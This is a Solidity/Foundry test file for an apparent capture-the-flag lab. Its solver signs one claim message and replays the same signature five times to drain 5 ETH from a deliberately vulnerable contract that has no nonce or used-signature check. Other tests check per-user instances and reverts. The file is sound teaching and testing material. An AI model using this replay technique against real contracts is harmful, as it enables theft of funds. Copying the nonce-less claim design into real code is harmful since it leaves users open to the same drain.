// SPDX-License-Identifier: MIT
pragma solidity ^0.8.35;

import {Test} from "forge-std/Test.sol";
import {MessageHashUtils} from "@openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
import {Q10ReplayLab, Q10VulnerableSigClaim} from "../src/Setup.sol";

contract Q10ReplayTest is Test {
    Q10ReplayLab internal lab;

    address internal alice;
    uint256 internal alicePk;
    address internal bob;
    uint256 internal bobPk;

    function setUp() public {
        lab = new Q10ReplayLab();
        vm.deal(address(lab), 100 ether);
        (alice, alicePk) = makeAddrAndKey("alice");
        (bob, bobPk) = makeAddrAndKey("bob");
    }

    function _signOnce(uint256 pk, address payable to, uint256 amount)
        internal
        pure
        returns (bytes memory)
    {
        bytes32 raw = keccak256(abi.encode(to, amount));
        bytes32 ethHash = MessageHashUtils.toEthSignedMessageHash(raw);
        (uint8 v, bytes32 r, bytes32 s) = vm.sign(pk, ethHash);
        return abi.encodePacked(r, s, v);
    }

    function _solve(address user, uint256 pk) internal {
        vm.prank(user);
        lab.createInstance(user);

        Q10VulnerableSigClaim c = lab.claimOf(user);

        bytes memory sig = _signOnce(pk, payable(user), 1 ether);
        // Replay 5 times — same (to, amount, signature) — drains 5 ETH.
        for (uint256 i = 0; i < 5; ++i) {
            vm.prank(user);
            c.claim(payable(user), 1 ether, sig);
        }
    }

    function test_AliceDrainsViaReplay() public {
        uint256 aliceBefore = alice.balance;
        _solve(alice, alicePk);

        Q10VulnerableSigClaim c = lab.claimOf(alice);
        assertEq(address(c).balance, 0, "claim drained");
        assertEq(alice.balance, aliceBefore + 5 ether, "alice keeps 5 ether");
        assertTrue(lab.isSolved(alice));
    }

    function test_TwoUsersIndependent() public {
        _solve(alice, alicePk);
        _solve(bob, bobPk);

        assertTrue(lab.isSolved(alice));
        assertTrue(lab.isSolved(bob));

        assertTrue(lab.claimOf(alice) != lab.claimOf(bob));
    }

    function test_WrongSignerSignatureReverts() public {
        vm.prank(alice);
        lab.createInstance(alice);
        Q10VulnerableSigClaim c = lab.claimOf(alice);

        bytes memory sig = _signOnce(bobPk, payable(alice), 1 ether);

        vm.prank(alice);
        vm.expectRevert(bytes("bad sig"));
        c.claim(payable(alice), 1 ether, sig);
    }

    function test_DoubleCreateReverts() public {
        vm.startPrank(alice);
        lab.createInstance(alice);
        vm.expectRevert(bytes("already created"));
        lab.createInstance(alice);
        vm.stopPrank();
    }

    function test_SixthReplayReverts() public {
        _solve(alice, alicePk);
        Q10VulnerableSigClaim c = lab.claimOf(alice);
        bytes memory sig = _signOnce(alicePk, payable(alice), 1 ether);
        // Vault is empty; the next replay still passes signature check
        // but fails on `to.call{value: 1 ether}("")` because there are no
        // funds left to send.
        vm.prank(alice);
        vm.expectRevert();
        c.claim(payable(alice), 1 ether, sig);
    }
}
